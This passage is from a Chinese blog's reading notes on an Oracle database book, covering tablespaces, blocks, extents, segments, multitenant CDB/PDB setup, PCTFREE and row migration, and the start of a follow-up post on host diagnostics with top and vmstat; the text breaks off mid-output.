tablespace)在分配数据扩展时只能使用此种方式。对于由系统管理(AUTOALLOCATE)的数据扩展，就无从插手干预了，Oracle或许一个区申请20M,下一个区忽然申请100M,Oracle在运行过程中自行决定新增数据扩展的最佳容量，我们无从得知规律。不过还是有一个下限的，即区的扩展过程中其最小容量不能低于64KB,假如数据块容量大于等于16KB,这个下限将从64KB转变为1MB。\n表空间分类在 Oracle 数据库中，表空间（Tablespace）是组织和管理数据文件的逻辑容器。表空间是数据库中最大的逻辑存储单元，所有的数据库对象（如表、索引、回滚段等）都存储在表空间中。Oracle 支持多种类型的表空间，每种类型有不同的用途和特点。\n系统表空间系统表空间是数据库中默认创建的表空间之一，用于存储数据库的数据字典和其他重要元数据。\n\n包含数据库的数据字典信息，如表、视图、存储过程等。\n包含数据库的控制信息。\n通常不应用于存储用户数据。\n\n临时表空间临时表空间用于存储临时数据，如排序操作、临时表等。\n\n数据是非持久的，会在会话结束或事务提交后自动清除。\n临时表空间中的数据文件称为临时文件（Temporary Files）。\n通常用于支持临时表和排序操作。\n\n回滚表空间回滚表空间用于存储事务回滚所需的信息。\n\n用于支持事务的回滚操作。\n通常包含一个或多个数据文件。\n\n逻辑结构初次体会上面都是概念性的东西，下面开始实操。\nBlock 块查询数据库的块(BLOCK)大小为8KB,这是Oracle的最小逻辑单位。\nSQL&gt; show parameters db_block_size;NAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------db_block_size                        integer     8192\n\n也可以通过观察表空间视图 dba_tablespaces 的 block_size 值获取。\nSQL&gt; select block_size from dba_tablespaces where tablespace_name=&#x27;SYSTEM&#x27;;BLOCK_SIZE----------      8192\n\nTablespace 表空间-- 创建普通数据表空间CREATE TABLESPACE &quot;test&quot;    DATAFILE &#x27;/opt/oracle/oradata/FREE/test.dbf&#x27;    SIZE 100M -- 数据文件的初始大小    AUTOEXTEND ON -- 允许数据文件自动扩展-- 创建临时表空间CREATE TEMPORARY TABLESPACE test_temp    TEMPFILE &#x27;/opt/oracle/oradata/FREE/test_temp.dbf&#x27;    SIZE 50M    AUTOEXTEND ON-- 创建回滚段表空间CREATE UNDO TABLESPACE test_undo    DATAFILE &#x27;/opt/oracle/oradata/FREE/test_undo.dbf&#x27;    SIZE 100M    AUTOEXTEND ON-- 系统表空间SELECT file_name,       tablespace_name,       autoextensible,       bytes / 1024 / 1024FROM DBA_DATA_FILESWHERE TABLESPACE_NAME LIKE &#x27;SYS%&#x27;order by substr(file_name, -12);\n\n系统表空间查询结果：\n\n\n\nFILE_NAME\nTABLESPACE_NAME\nAUTOEXTENSIBLE\nBYTES&#x2F;1024&#x2F;1024\n\n\n\n&#x2F;opt&#x2F;oracle&#x2F;oradata&#x2F;FREE&#x2F;sysaux01.dbf\nSYSAUX\nYES\n1450\n\n\n&#x2F;opt&#x2F;oracle&#x2F;oradata&#x2F;FREE&#x2F;system01.dbf\nSYSTEM\nYES\n1090\n\n\nSYSAUX 表空间用于存储数据库的辅助数据，如索引组织表（Index Organized Tables, IOTs）、LOB 数据、数据字典视图快照等。它是 Oracle 10g 及以后版本引入的表空间，用于减轻 SYSTEM 表空间的压力。\n\n系统表空间和用户表空间属于永久保留数据的表空间。\n\nUser 用户-- 创建用户drop user &quot;test&quot; cascade;create user &quot;test&quot;    identified by &quot;test_password&quot;    default tablespace &quot;test&quot;    temporary tablespace test_temp;-- 赋权grant dba to &quot;test&quot;;\n\n上述创建用户的命令会报错：ORA-65096: 公用用户或角色名称必须以前缀 C## 开头这是因为 Oracle Database 12c 引入了一项重要的新特性：多租户架构，其中包括容器数据库（CDB）和可插入数据库（PDB）。这项特性极大地改变了数据库管理的方式，提供了更好的资源隔离、简化了数据库部署和维护，并增强了安全性。在书中并未这部分，可能作者使用的版本较低。所以这部分是查资料所得。\n容器数据库（Container Database, CDB）是一个包含多个可插入数据库（Pluggable Databases, PDBs）的数据库。CDB 包括根容器（Root Container）和种子容器（Seed Container），以及一个或多个可插入数据库。\n\n根容器：CDB 的根容器包含全局数据库对象和管理信息。根容器通常不包含用户数据。\n种子容器：CDB 的种子容器是一个特殊的 PDB，用于创建新的 PDB 时作为模板。每个 CDB 都有一个种子容器，通常命名为 PDB$SEED。\n\n可插入数据库（Pluggable Database, PDB）是 CDB 中的独立数据库环境，可以像传统的独立数据库一样使用，但它们共享同一套物理文件和资源。每个 PDB 都有自己的表空间、用户、角色、对象等。\n\n独立性：每个 PDB 都是一个完整的数据库环境，拥有自己的表空间、用户、角色和数据。\n资源隔离：PDB 之间相互隔离，可以配置资源限制，以防止一个 PDB 影响其他 PDB 的性能。\n可移植性：PDB 可以轻松地在不同的 CDB 之间移动，甚至可以在不同的 Oracle 数据库版本之间移动。\n共享资源：尽管每个 PDB 都是独立的，但它们共享 CDB 的物理文件和资源，从而减少了管理开销和提高了资源利用率。\n\n使用 CDB 和 PDB 带来的好处\n\n简化管理：通过将多个数据库作为 PDB 放入单个 CDB 中，可以大大简化数据库的管理。例如，补丁更新、备份和恢复等操作只需要在 CDB 层级执行即可。\n资源隔离：PDB 之间的资源可以被隔离，从而确保每个 PDB 都有稳定的资源使用环境。\n安全性增强：每个 PDB 都可以有自己的安全策略，从而增强了整个系统的安全性。\n成本节省：多个 PDB 共享 CDB 的资源，可以减少硬件成本和许可证费用。\n\n下面是相关的 sql 语句。\n-- 查看当前容器show con_nameselect sys_context(&#x27;USERENV&#x27;,&#x27;CON_NAME&#x27;) conname from dual;-- 查看PDBselect con_id, dbid, name, open_mode from v$pdbs;-- 新建 PDB (PDB有多种创建方式，这里是通过PDB$SEED创建PDB。此外还有通过PDB创建PDB等多种方式，毕竟PDB是可插拔的，注定它的管理方式是多种多样的。)-- 其中 oracledb 是可插接式数据库名称，TEST_USER 是创建的该PDB的管理员用户，123456 是密码。file_name_convert 指定了文件名转换规则，用于将种子 PDB (PDB$SEED) 的数据文件路径转换为目标 PDB (oracledb) 的数据文件路径。create pluggable database oracledb admin user TEST_USER identified by 123456 file_name_convert = (&#x27;/opt/oracle/oradata/ORCLCDB/pdbseed&#x27;,&#x27;/opt/oracle/oradata/orclcdb/oracledb&#x27;);-- 创建完成后的 PDB 数据库还不能直接使用，因为此时他的状态是 MOUNTED。使用下面的sql更改其状态。alter pluggable database oracledb open;alter pluggable database all open;-- 切换容器alter session set container=PDB$SEED;alter session set container=oracledb;\n\n创建完成之后，就可以使用新的用户连接到数据库里。jdbc:oracle:thin:@//127.0.0.1:1521/oracledb\n这里简单叙述下 PDB 和 CDB 的概念，和基本的用户创建。下面回到书中，继续体会逻辑结构。\nEXTENT 区Oracle的最小逻辑单位是块(BLOCK),而最小的扩展单位是区(EXTENT).\n-- 创建表 如果没有指定表空间，则使用该用户默认的表空间drop table t purge;create table t (id int) tablespace default_dataspace;-- 查询数据字典获取extent相关信息select segment_name,       extent_id,       tablespace_name,       bytes/1024/1024,blocksfrom user_extentswhere segment_name=&#x27;T&#x27;;\n\n插入 2000000 条数据后，有39个区。\n\n\n\nSEGMENT_NAME\nEXTENT_ID\nTABLESPACE_NAME\nBYTES&#x2F;1024&#x2F;1024\nBLOCKS\n\n\n\nT\n0\nSYSTEM\n0.0625\n8\n\n\nT\n1\nSYSTEM\n0.0625\n8\n\n\nT\n2\nSYSTEM\n0.0625\n8\n\n\nT\n3\nSYSTEM\n0.0625\n8\n\n\nT\n4\nSYSTEM\n0.0625\n8\n\n\nT\n5\nSYSTEM\n0.0625\n8\n\n\nT\n6\nSYSTEM\n0.0625\n8\n\n\nT\n7\nSYSTEM\n0.0625\n8\n\n\nT\n8\nSYSTEM\n0.0625\n8\n\n\nT\n9\nSYSTEM\n0.0625\n8\n\n\nT\n10\nSYSTEM\n0.0625\n8\n\n\nT\n11\nSYSTEM\n0.0625\n8\n\n\nT\n12\nSYSTEM\n0.0625\n8\n\n\nT\n13\nSYSTEM\n0.0625\n8\n\n\nT\n14\nSYSTEM\n0.0625\n8\n\n\nT\n15\nSYSTEM\n0.0625\n8\n\n\nT\n16\nSYSTEM\n1\n128\n\n\nT\n17\nSYSTEM\n1\n128\n\n\nT\n18\nSYSTEM\n1\n128\n\n\nT\n19\nSYSTEM\n1\n128\n\n\nT\n20\nSYSTEM\n1\n128\n\n\nT\n21\nSYSTEM\n1\n128\n\n\nT\n22\nSYSTEM\n1\n128\n\n\nT\n23\nSYSTEM\n1\n128\n\n\nT\n24\nSYSTEM\n1\n128\n\n\nT\n25\nSYSTEM\n1\n128\n\n\nT\n26\nSYSTEM\n1\n128\n\n\nT\n27\nSYSTEM\n1\n128\n\n\nT\n28\nSYSTEM\n1\n128\n\n\nT\n29\nSYSTEM\n1\n128\n\n\nT\n30\nSYSTEM\n1\n128\n\n\nT\n31\nSYSTEM\n1\n128\n\n\nT\n32\nSYSTEM\n1\n128\n\n\nT\n33\nSYSTEM\n1\n128\n\n\nT\n34\nSYSTEM\n1\n128\n\n\nT\n35\nSYSTEM\n1\n128\n\n\nT\n36\nSYSTEM\n1\n128\n\n\nT\n37\nSYSTEM\n1\n128\n\n\nT\n38\nSYSTEM\n1\n128\n\n\nSEGMENT 段观察数据段\n-- 查询数据字典获取segment相关信息select segment_name,       segment_type,       tablespace_name,       blocks,       extents,bytes/1024/1024from user_segmentswhere segment_name =&#x27;T&#x27;;\n\n\n\n\nSEGMENT_NAME\nSEGMENT_TYPE\nTABLESPACE_NAME\nBLOCKS\nEXTENTS\nBYTES&#x2F;1024&#x2F;1024\n\n\n\nT\nTABLE\nSYSTEM\n3072\n39\n24\n\n\n2000000 条数据，占用了24M空间，用了39个区，3072个块。\n观察索引段\n-- 创建索引create index idx_id on t(id);-- 查询数据字典获取segment相关信息select segment_name,       segment_type,       tablespace_name,       blocks,       extents,       bytes/1024/1024from user_segmentswhere segment_name =&#x27;IDX_ID&#x27;;\n\n\n\n\nSEGMENT_NAME\nSEGMENT_TYPE\nTABLESPACE_NAME\nBLOCKS\nEXTENTS\nBYTES&#x2F;1024&#x2F;1024\n\n\n\nIDX_ID\nINDEX\nSYSTEM\n4608\n51\n36\n\n\n逻辑结构二次体会BLOCK的大小和调整一般来说，Oracle默认的数据库块大小就是8KB,是在创建数据库时决定的，所以如果想改变块的大小，就必须在建库时指定。Oracle9i以后的版本中，Oracle支持用户在新建用户表空间时指定块的大小，这意味着数据库有多个表空间，他们各自的BLOCK大小有可能各不相同。切记只是新建的用户表空间，原有的已经建好的表空间是不可以更改的，系统表空间更不可能更改或调整。\nSQL&gt; show parameters cache_sizeNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------client_result_cache_size             big integer 0data_transfer_cache_size             big integer 0db_16k_cache_size                    big integer 0db_2k_cache_size                     big integer 0db_32k_cache_size                    big integer 0db_4k_cache_size                     big integer 0db_8k_cache_size                     big integer 0db_cache_size                        big integer 0db_flash_cache_size                  big integer 0db_keep_cache_size                   big integer 0db_recycle_cache_size                big integer 0\n\n上面的参数意味着可以设置2KB、4KB、8KB、16KB、32KB的块大小。如果将 db_16k_cache_size 设置为 1OOMB，就意味着SGA中的 DATA BUFFER 数据缓存区中将会有10OMB的大小让内存块可以以16KB的大小进行访问了，同时也意味着16KB大小的设置从此生效了。然后建表空间，切记加上 blocksize 16K 的关键字即可。这里就不演示了。\nPCTFREE 参数、调整和生效范围之前有说 BLOCK 块有一个FREE空间，是由PCTFREE参数决定的，设置这个参数来控制BLOCK保留一些空间。为什么要保留是之前留下的问题。下面举例子来解答：假如数据库中有某表T有900行记录，如果一个块最多可以装10行记录，最终需要90个块将T表记录装满。如果PCTFREE为10，表示会预留10%的空间，那就是每个块都只能装9行数据，最终需要100个块才可以把T表记录装满。这时做全表扫描的查询，查询T表的所有记录，如果PCTFREE设置为1O，将会遍历100个数据块。如果为0，将遍历90个数据块。这种情况下，当然是PCTFREE设置为0的效率更高。但是只有在只读数据库或者说只有插入删除很少更新的数据库环境中，才合适将PCTFREE设置为0。预留的空间是为了更新操作。\n有的表频繁更新，有的表几乎是只读的，从不更新。所以不同类型的表就应该设置不同的PCTFREE，表在数据库中就是SEGMENT，因此PCTFREE这个参数其实是可以只针对某个具体段的系列区包含的BLOCK生效。Oracle有一个默认的属性，就是PCTFREE&#x3D;1O，在整个数据库层面生效。但是具体到建T表时，可以指定PCTFREE为别的值，比如20，那这个T表或者说SEGMENT T的所有块的属性，就是PCTFREE为20。\nEXTENT 尺寸与调整区的大小是可以设置的，之前在区的逻辑结构中可以看到区的大小有时是0.0625MB(扩展8个块)，有时是1MB(128个块)，这是表空间区拓展大小设置的是自动拓展的缘故。如果想要自定义，可以在创建表空间时添加 uniform size 1OM 的关键字，表示扩展是统一尺寸，大小都是1OMB。\n逻辑结构三次体会以用和未用表空间情况查看表空间剩余情况\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_free_space group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------SYSTEM                                       2.4375SYSAUX                                      28.3125UNDOTBS1                                    92.3125\n\n查看表空间总体空间情况\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_data_files group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------SYSAUX                                          430SYSTEM                                          340UNDOTBS1                                        100\n\n表空间大小和自动拓展表空间没有开启自动拓展（AUTOEXTENSIBLE &#x3D; NO）或者开启了自动拓展但存储空间不够了，此时会报错：ORA-01654: 索引 XXX 无法通过 128 (在表空间 xxx 中) 扩展\n磁盘还有存储空间，但没有开启自动拓展导致表空间不足。这时手动添加数据文件可以解决：ALTER TABLESPACE TBS_UB ADD DATAFILE &#39;/opt/oracle/oradata/FREE/db02.dbf&#39;SIZE 100M;或者开启自动拓展，让oracle自己拓展：alter database datafile &#39;/opt/oracle/oradata/FREE/db02.dbf&#39;autoextend on;\n磁盘不足导致表空间不足的话，可以考虑删除数据（数据是宝贵的，不建议删）或者添加硬件。drop tablespace TBS_UB including contents and datafiles; 其中 including contents and datafiles 表示要删除表空间的数据和对应的数据文件，如果表空间有数据，不增加 including contents 将无法删除成功。\n回滚表空间的新建与切换Oracle数据库建好后，UNDO表空间和TEMP表空间必然是建好了。但是实际情况是，回滚段和表空间都可以新建，并且用户都可以指定新建的空间。\n查看数据库当前在用回滚段，数据库当前的回滚表空间名为UNDOTBS1:\nSQL&gt; show parameters undoNAME                                 TYPE        VALUE------------------------------------ ----------- ------------------------------temp_undo_enabled                    boolean     FALSEundo_management                      string      AUTOundo_retention                       integer     900undo_tablespace                      string      UNDOTBS1\n\n\n其中 undo_management 的取值为 AUTO 表示是系统自动管理表空间而非手动管理。\n\n查看当前数据库有几个回滚段\nSQL&gt; select tablespace_name,contents,status from dba_tablespaces where contents=&#x27;UNDO&#x27;;TABLESPACE_NAME                CONTENTS              STATUS------------------------------ --------------------- ---------UNDOTBS1                       UNDO                  ONLINE\n\n查看数据库回滚段的大小\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_data_files where tablespace_name = &#x27;UNDOTBS1&#x27; group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------UNDOTBS1                                        100\n\n切换回滚段的方法 alter system set undo_tablespace=undotbs2 scope=both; \n\n当前使用中的回滚段是无法被删除的回滚表空间是真的可以新建多个，并且自由切换的，但是数据库当前使用的回滚表空间却只能有一个（注：RAC数据库会有多个）\n\n临时表空间的新建和切换回滚表空间的特点是，数据库中可以建立多个，但是目前的在用表空间却只能有一个。而临时表空间在数据库中也可以建多个，却可以被同时使用。\n查看临时表空间大小\nSQL&gt; select tablespace_name,sum(bytes)/1024/1024 from dba_temp_files group by tablespace_name;TABLESPACE_NAME                SUM(BYTES)/1024/1024------------------------------ --------------------TEMP                                             20\n\n查看用户默认表空间和临时表空间\nSQL&gt; select DEFAULT_TABLESPACE,TEMPORARY_TABLESPACE,username from dba_users where username=&#x27;TEST_USER&#x27;;DEFAULT_TABLESPACE             TEMPORARY_TABLESPACE           USERNAME------------------------------ ------------------------------ --------------------------------------------------------------------------------------------------------------------------------SYSTEM                         TEMP                           TEST_USER\n\nalter user TEST_USER temporary tablespace TEMP02; 指定用户切换临时表空间alter database default temporary tablespace TEMP02; 切换所有用户默认临时表空间\n回滚段建多个的目的是可以瘦身，原先的回滚段一直扩展导致空间浪费太多，新建出来的小一点，切换成功后删除原来旧的回滚表空间，磁盘空间就空余出来了。而临时表空间是为了避免竞争。Oracle可以为每个用户指定不同的临时表空间，每个临时表空间的数据文件都在磁盘的不同位置上，减少了IO竞争。oracle还可以为统一用户不同session设置不同的临时表空间，进一步减少竞争。\n实际上建临时表空间组很简单，只要新建一个临时表空间，然后加上 tablespace group tmp_group ,就默认建成了一个名为 tmp_group 的临时表空间组了。例如：create tablespace tmp_group01 datafile &#39;/opt/oracle/oradata/FREE/tmp_group01.dbf&#39; size 100M tablespace group tmp_group;create tablespace tmp_group02 datafile &#39;/opt/oracle/oradata/FREE/tmp_group02.dbf&#39; size 100M tablespace group tmp_group;create tablespace tmp_group03 datafile &#39;/opt/oracle/oradata/FREE/tmp_group03.dbf&#39; size 100M tablespace group tmp_group;\n查询临时表空间情况\nSQL&gt; select * from dba_tablespace_groups;GROUP_NAME             TABLESPACE_NAME---------------------- ------------------------------TMP_GROUP              TMP_GROUP01                  TMP_GROUP              TMP_GROUP02                  TMP_GROUP              TMP_GROUP03                  \n\n指定某表空间移动到临时表空间组 alter tablespace TMP_GROUP04 tablespace group TMP_GROUP;使用 alter user TEST_USER temporary tablespace TMP_GROUP; 将用户切换到临时表空间组后。\n虽然是同一用户登录的，但不同的SESSION都会自动分配到了不同的临时表空间。同时，临时表空间组也可以分配多个。\n临时表空间组可以往表空间组里不断新增临时表空间，让数据库在运行时自动从临时表空间组中选择各个临时表空间，不只是用户层面，而且是在SESSION层面进行IO均衡负载，极大地提升了数据库的性能。\nEND过度拓展与性能extent是Oracle数据库扩展的最小单位，而且大小是可以设置的。如果某表（或者说某段）记录增长特别快，就可以考虑把这个EXTENT的大小设置得大一点，比如initial extent和incremental extent都设置比较大，这样申请扩展的次数就会减少，性能可以提高。\n下面来做个实验：首先建两个表空间，TBS_UB_A_01、TBS_UB_B_01，然后分别在两个表空间上建表。\nSQL&gt; create tablespace TBS_UB_A datafile &#x27;/home/oracle/TBS_UB_A_01.DBF&#x27; size 10M autoextend on uniform size 64k;Tablespace created.Elapsed: 00:00:00.59SQL&gt; create tablespace TBS_UB_B datafile &#x27;/home/oracle/TBS_UB_B_01.DBF&#x27; size 2G;Tablespace created.Elapsed: 00:00:07.87SQL&gt; CREATE TABLE t_a (id int)tablespace TBS_UB_A;Table created.Elapsed: 00:00:00.37SQL&gt; CREATE TABLE t_b (id int)tablespace TBS_UB_B;Table created.Elapsed: 00:00:00.01\n\n上面创建表空间 TBS_UB_A 大小设置的为10M，想要模拟表空间不足，在大量拓展时的性能如何。书上设置的大小为1M。这里可能由于版本原因，设置1M会报错：ORA-03214: The specified file size is smaller than the minimum blocks 784.表示尝试创建的数据文件的大小小于 Oracle 数据库要求的最小大小。因为 Oracle 数据库需要一定的空间来存储元数据和其他管理信息，即使数据文件为空。接下来开始做试验，插入200万数据。分别插入两张表，观察耗时和拓展次数。\nSQL&gt; insert into t_a select rownum from dual connect by level&lt;=2000000;2000000 rows created.Elapsed: 00:00:01.47SQL&gt; insert into t_b select rownum from dual connect by level&lt;=2000000;2000000 rows created.Elapsed: 00:00:01.64SQL&gt; select count(*)from user_extents where segment_name=&#x27;T_A&#x27;;  COUNT(*)----------       386Elapsed: 00:00:00.13SQL&gt; select count(*)from user_extents where segment_name=&#x27;T_B&#x27;;  COUNT(*)----------        40Elapsed: 00:00:00.13\n\n这里耗时差不多，但是拓展次数明显表空间小的更多。这里与书上的结果不一致，可能是因为后续的oracle版本对这方面做了优化。不过不可否认的是，拓展的次数少了，少做事也是书中第一章的核心。\nPCTFREE 与性能PCTFREE 参数在 Oracle 数据库中用于控制数据块中可用空间的比例，以便在插入或更新数据时保留一定的空闲空间。根据数据库对表更新的频繁程度，对表的 PCTFREE 做设置，避免和链式行产生行迁移，影响性能。\n在 Oracle 数据库中，行迁移和链式行是与数据块管理和行更新相关的概念。当行更新导致其大小发生变化时，可能会发生这两种情况。\n行迁移 发生在更新行时，更新后的行大小超过了原来所在的块中的可用空间。当这种情况发生时，Oracle 数据库会尝试将更新后的行迁移到同一个数据块内的其他空闲空间中。如果在同一个数据块内找不到足够的空闲空间，Oracle 会尝试将行迁移到其他数据块中。\n\n性能影响：行迁移可能导致数据块之间的数据碎片化，增加后续操作的 I&#x2F;O 成本。\n空间浪费：如果预留的空间不足以容纳更新后的行，可能会导致空间浪费。\n\n链式行 发生在行迁移后仍然无法在一个数据块中容纳更新后的行的情况下。在这种情况下，Oracle 会将行分割成多个片段，并将这些片段分布在不同的数据块中。每个片段都会包含指向下一个片段的指针，形成一个链表。\n\n性能影响：链式行会增加 I&#x2F;O 成本，因为每次读取或更新行时都需要访问多个数据块。\n空间浪费：链式行可能导致更多的空间浪费，因为每个片段都需要额外的空间来存储指向下一个片段的指针。\n\n优化的方法是：\n\n使用 PCTFREE 参数：通过设置 PCTFREE 参数，可以在数据块中预留一定比例的空间，以便在行更新时有足够的空间来容纳更新后的行。\n调整数据块大小：根据数据的特点调整数据块大小，以减少行迁移和链式行的发生。\n合理设计表结构：合理设计表结构，例如使用变长列和定长列的组合，可以减少行大小的变化，从而降低行迁移和链式行的可能性。\n定期分析和优化表：定期执行 ANALYZE 和 OPTIMIZE 操作可以帮助减少数据碎片化。见文末。\n\n这里不进行实验了，简单描述下。（没有测试表，暂时先这样吧）当表的字段类型由 varchar2(20) 改为 varchar2(2000)。这时，往表中填满这些字段，便会产生大量的行迁移。此时，进行查询便会产生大量的逻辑读，导致性能的降低。因为行迁移会导致数据在数据块间分布不均，造成数据碎片化。行链接也是一样，更新后的行无法在一个数据块中完全容纳，Oracle 会将行分割成多个片段，并将这些片段分布在不同的数据块中。每个片段都会包含指向下一个片段的指针，形成一个链表。这都意味着在后续的查询或操作中，Oracle 需要从多个数据块中读取数据，增加了逻辑读的次数。消除行迁移的一个简单方法就是数据重建。CREATE TABLE TABLE_NAME_BK AS select * from TABLE_NAME;\n行迁移与优化如何发现表存在行迁移？\n-- 首先建chained_rows相关表，这是必需的步骤@?/rdbms/admin/utlchain.sql-- 以下命令针对T表做分析，将产生行迁移的记录插入到chained_rows表中analyze table t list chained rows into chained_rows;-- 通过分析结果可以看到具体哪条记录产生了行迁移select count(1) from chained_rows where table_name = &#x27;T&#x27;;\n\n通过这个方法可以了解到哪些表产生了严重的行迁移，可以适当做出改进。比如重建新表消除行迁移，然后对PCTFREE做适当的调整等。下面可以对当前用户所有表做分析。\nselect &#x27;analyze table &#x27; || table_name || &#x27; list chained rows into chained_rows;&#x27; from user_tables;select * from chained_rows;\n\nOracle 官网 CHAINED_ROWS\n块的大小与应用BLOCK除了谈这个PCTFREE属性外，还有本身设置多大的问题。有的系统设置8KB甚至4KB、2KB，而有的系统设置16KB甚至32KB大。BLOCK是Oracle最小的单位。如果Oracle是单块读，则一次读取一个块，就是一个IO，当然如果是一次读取多个块，那还是算一个IO，这称之为多块读。这里有一个问题，如果块越大，装的行记录就越多，那所需要的块就越少，换句话说，读取记录产生的IO就越少。那块越大越好吗？显然不可能这么极端。\n实际情况是，对于数据仓库OLAP的数据库应用，一般倾向于BLOCK尽量大，而OLTP应用，一般倾向于BLOCK尽量不要太大。OLAP和OLTP的差别在于，前者一般查询返回大量的数据，而后者查询返回极少量数据。前者一般用户不多，并发不大，后者一般用户很多，并发很大。因此OLAP系统最多的查询方式应该是全表扫描，而OLTP系统最多的方式应该是索引读。\n其中的原理主要是较大的块可以减少IO，同时提高缓存的命中率，可以提升全表扫描的性能。而较小的块每次IO操作涉及的数据量较小，可以降低锁的竞争，提高并发性能，同时较小的数据块也有助于提高索引的性能，因为索引通常涉及到随机访问，较小的数据块可以更快地定位到所需数据。\n-- 准备两个表空间，块大小分别为8K和16Kdrop tablespace TBS_UB_8K INCLUDING CONTENTS AND DATAFILES;create tablespace TBS_UB_8K    blocksize 8K    datafile &#x27;/home/oracle/TBS_UB_8K_01.DBF&#x27;size 1G;drop tablespace TBS_UB_16K INCLUDING CONTENTS AND DATAFILES;create tablespace TBS_UB_16K    blocksize 16K    datafile &#x27;/home/oracle/TBS_UB_16k_01.DBF&#x27;size 1G;-- 在两个表空间上分别创建300万数据量的大表，并创建索引。drop table t_16k purge;create table t_16k tablespace tbs_ljb_16k as select * from dba_objects;insert into t_16k select * from t_16k;-- ...省略插入数据update t_16k set object_id = rownum;create index idx_object_id on t_16k (object_id);commit;-- ...t_8k 的创建过程同上，略-- 然后可以比较两个表在全表扫和索引的读下的性能了。-- 记得查看执行计划。select count(*) from t_8k;select count(*) from t_16k;select * from t_8k where object_id = 29;select * from t_16k where object_id = 29;\n\n书上的预期情况是 全表扫描的性能是大块有优势的，索引读的性能是不分上下的（可能块大小差别没那么大）。最后这里没有实践，不知道Oracle后续版本有没有优化。\nANALYZE 和 OPTIMIZE在 Oracle 数据库中，定期执行 ANALYZE 和 OPTIMIZE 操作可以帮助减少数据碎片化，并保持统计信息的准确性，从而提高查询性能。可以参考的文章 Oracle表的分析统计这部分好像很复杂啊\nANALYZE 操作ANALYZE 操作用于收集表和索引的统计信息，这些信息用于优化器制定执行计划。通过定期执行 ANALYZE，可以确保优化器拥有最新的统计数据，从而选择最优的查询执行计划。\n-- 分析表ANALYZE TABLE mytable COMPUTE STATISTICS;-- 分析索引ANALYZE INDEX myindex COMPUTE STATISTICS;\n\nOPTIMIZE 操作OPTIMIZE 操作用于重新组织索引，减少碎片并提高索引的效率。对于 B 树索引，OPTIMIZE 操作会压缩索引，减少索引占用的空间并提高查询性能。\n-- 优化索引ALTER INDEX myindex REBUILD;\n\n注意事项\n性能影响：执行 ANALYZE 和 OPTIMIZE 操作可能会对数据库性能产生影响，尤其是在大型表和索引上。因此，通常建议在非高峰时段执行这些操作。\n\n资源消耗：这些操作可能会消耗较多的 CPU 和 I&#x2F;O 资源。在执行之前，请确保有足够的资源可用。\n\n备份：在执行 REBUILD 操作之前，建议先备份索引，以防万一出现问题。\n\n定期执行：根据表的使用频率和数据变化情况，定期执行 ANALYZE 和 OPTIMIZE 操作。\n\n数据大量更新后：在对表进行了大量插入、删除或更新操作后，执行 ANALYZE 和 OPTIMIZE 可以帮助减少数据碎片化并更新统计信息。\n\n\n也可以使用 DBMS_STATS 包查看和修改为数据库对象收集的优化器统计信息。Oracle 官方文档 DBMS_STATS\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记下篇","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8B%E7%AF%87/","content":"下篇的章节，主要是作者多年优化工作中的经验总结。主要是关于解决问题的思路，如何定位问题等。技术相关的其实不多。我也觉得会发现问题比会解决问题的人更厉害。这几章经典的优化操作，主要的思想就是以下这些。（我读完的总结，不一定全。）\n\n少做事，在可以满足需求的情况下，尽量不做无意义的事。毕竟再怎么优化也没有不做快。比如，排序是否需要，一定要的情况下是否可以走索引，所以是有序的，可以避免排序。\n提问的方式，描述问题要准确、有重点。避免太过简单或者太过复杂。另外，不要问以前问过的问题，勤用搜索引擎和动手实践独立解决问题。\n规范，学习、操作、流程、开发、设计等等方面都需要有规范，规范可以提高效率避免出错。\n\n下面是一些命令，用于排查问题等。\n流程规范 保障问题快速解决动态整体主机动态情况检查\n# 主机情况检查（数据库出问题，主机是首先要查看的，皮之不存，毛将焉附）uname -a# 检查主机CPU等使用情况（重点关注时间最长的，同时也注意观察主机的内存的物理大小和CPU的个数)top # 报告虚拟内存统计信息以及其他与系统活动相关的信息 1 10 表示每秒输出一次统计信息，一共输出10次vmstat 1 10# 统计所有包含 &quot;ora&quot; 的进程数。ps -ef |grep ora |wc -l# 统计所有既包含 &quot;ora&quot; 又包含 &quot;LOCAL&quot; 的进程数，这通常指本地监听器和数据库实例的进程。ps -ef |grep ora |grep LOCAL |wc -l\n\nvmstat 命令输出结果含义：\n\nprocs:\nr: 当前运行和可运行（等待运行）的进程数。\nb: 处于不可中断睡眠状态的进程数。\n\n\nmemory:\nswpd: 使用的虚拟内存交换空间大小（KB）。\nfree: 空闲物理内存大小（KB）。\nbuff: 用作缓冲区的物理内存大小（KB）。\ncache: 用作缓存的物理内存大小（KB）。\n\n\nswap:\nsi: 每秒从磁盘交换到内存的大小（KB&#x2F;s）。\nso: 每秒从内存交换到磁盘的大小（KB&#x2F;s）。\n\n\nio:\nbi: 每秒从块设备读取的数据量（KB&#x2F;s）。\nbo: 每秒写入块设备的数据量（KB&#x2F;s）。\n\n\nsystem:\nin: 每秒发生的中断次数。\ncs: 每秒上下文切换次数。\n\n\ncpu:\nus: 用户空间占用的 CPU 百分比。\nsy: 内核空间占用的 CPU 百分比。\nid: 空闲 CPU 百分比。\nwa: 等待 I&#x2F;O 完成的 CPU 百分比。\nst: 被窃取的时间百分比（仅在虚拟化环境中可见）。\n\n\n\n输出示例：\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st 2  0      0 115444   6688 1897744    0    0   261    30    3    4  2  3 94  1  0 0  0      0 114500   6688 1897792    0    0     0    32 1949 3657  3  3 94  0  0 0  0      0 114648   6688 1897792    0    0     0     0 1642 2953  1  2 97  0  0 0  0      0 114512   6688 1897792    0    0     0 